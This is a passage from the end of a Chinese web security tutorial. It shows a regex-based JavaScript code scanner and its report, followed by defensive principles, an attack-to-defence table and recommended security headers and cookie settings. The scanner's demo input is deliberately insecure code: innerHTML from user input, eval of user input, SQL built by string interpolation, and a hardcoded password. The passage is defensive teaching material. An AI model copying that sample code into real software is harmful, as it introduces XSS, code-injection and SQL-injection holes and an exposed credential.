      const matches = sourceCode.match(new RegExp(pattern.regex.source, 'g'));
      if (matches) {
        issues.push({
          ...pattern,
          count: matches.length,
        });
      }
    }

    return issues;
  },

  /**
   * 生成安全报告
   */
  generateReport(issues) {
    const severityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
    const sorted = issues.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);

    const summary = {
      total: issues.length,
      critical: issues.filter((i) => i.severity === 'critical').length,
      high: issues.filter((i) => i.severity === 'high').length,
      medium: issues.filter((i) => i.severity === 'medium').length,
      low: issues.filter((i) => i.severity === 'low').length,
    };

    return { summary, issues: sorted };
  },
};

// 使用示例
const report = SecurityScanner.generateReport(
  SecurityScanner.scanCode(`
    // 示例代码
    container.innerHTML = userInput;
    eval(userInput);
    db.query(\`SELECT * FROM users WHERE id = \${userId}\`);
    const password = "admin123";
  `)
);
console.log(JSON.stringify(report, null, 2));
// {
//   summary: { total: 4, critical: 1, high: 2, medium: 1, low: 0 },
//   issues: [
//     { severity: 'critical', message: '模板字符串拼接 SQL 可能引发 SQL 注入', count: 1 },
//     { severity: 'high', message: 'innerHTML 赋值可能引发 XSS', count: 1 },
//     { severity: 'high', message: '硬编码密码', count: 1 },
//     { severity: 'medium', message: 'eval 执行可能引发代码注入', count: 1 }
//   ]
// }

```

---

## 总结

### 核心安全原则

1. **永不信任用户输入** — 所有输入都是潜在的攻击向量
2. **纵深防御** — 多层防护，一层失效时其他层仍然有效
3. **最小权限** — 每个组件只拥有完成任务所需的最小权限
4. **默认拒绝** — 不确定时，拒绝而非允许
5. **上下文感知** — 根据输出上下文选择正确的编码方式

### 攻击 → 防御速查表

| 攻击类型 | 核心防御 | 辅助防御 |
|---------|---------|---------|
| Stored XSS | 输入净化 + textContent | CSP |
| Reflected XSS | 输出编码 | CSP |
| DOM-based XSS | 不操作不可信 URL 数据 | CSP |
| CSRF | SameSite Cookie + CSRF Token | Origin 验证 |
| SQL 注入 | 参数化查询 | ORM + 输入验证 |
| 文件上传 | Magic Number 验证 + 重命名 | 沙箱隔离 |
| 信息泄露 | 选择性返回 + 安全错误处理 | 日志脱敏 |

### 安全 Headers 速查

```
Content-Security-Policy: default-src 'self'; script-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Cookie 安全配置速查

```
Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

---

*安全不是一次性的任务，而是持续的过程。定期审计、及时更新、保持警惕。*
